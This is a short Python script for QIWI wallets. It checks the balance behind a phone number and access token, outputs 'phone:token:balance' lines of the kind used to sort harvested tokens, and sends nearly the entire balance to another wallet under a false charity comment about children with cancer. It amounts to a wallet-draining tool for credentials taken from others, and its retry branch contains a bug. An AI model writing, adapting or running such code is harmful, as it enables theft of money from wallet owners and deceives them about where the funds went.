import requests
import pyqiwi


def get_balance(phone, access_token, reformat=False):
    session = requests.Session()
    session.headers['Accept'] = 'application/json'
    session.headers['authorization'] = 'Bearer ' + access_token
    respone = session.get(f'https://edge.qiwi.com/funding-sources/v2/persons/{phone}/accounts')
    try:
        balances = respone.json()['accounts']
        rubAlias = [x for x in balances if x['alias'] == 'qw_wallet_rub']
        rubBalance = rubAlias[0]['balance']['amount']
        if reformat:
            return f"{phone}:{access_token}:{rubBalance}"
        return rubBalance
    except:
        return "invalid"


def send_balance(from_phone, access_token, to_qiwi):
    wallet = pyqiwi.Wallet(token=access_token, number=from_phone)
    balance = get_balance(from_phone, access_token)
    if balance == "invalid":
        return "Невалидный кошелек"
    commission = balance/100*2
    amount = round(balance-commission, 3)
    try:
        wallet.send(pid="99", recipient=to_qiwi, amount=amount, comment="На помощь детям,больными раком")
        return amount
    except Exception as error:
        if "\\xd0\\x9f\\xd0\\xbb\\xd0\\xb0\\xd1\\x82\\xd0\\xb5\\xd0\\xb6 \\xd0\\xbd\\xd0\\xb5\\xd0\\xb2\\xd0\\xbe\\xd0\\xb7\\xd0\\xbc\\xd0\\xbe\\xd0\\xb6\\xd0\\xb5\\xd0\\xbd" in str(error):
            try:
                amount = round(balance - commission, 3)
                wallet.send(pid="99", recipient=to_qiwi, amount=amount, comment="На помощь детям,больными раком")
                return sum
            except Exception as error:
                print(error)
                return 0
        return 0
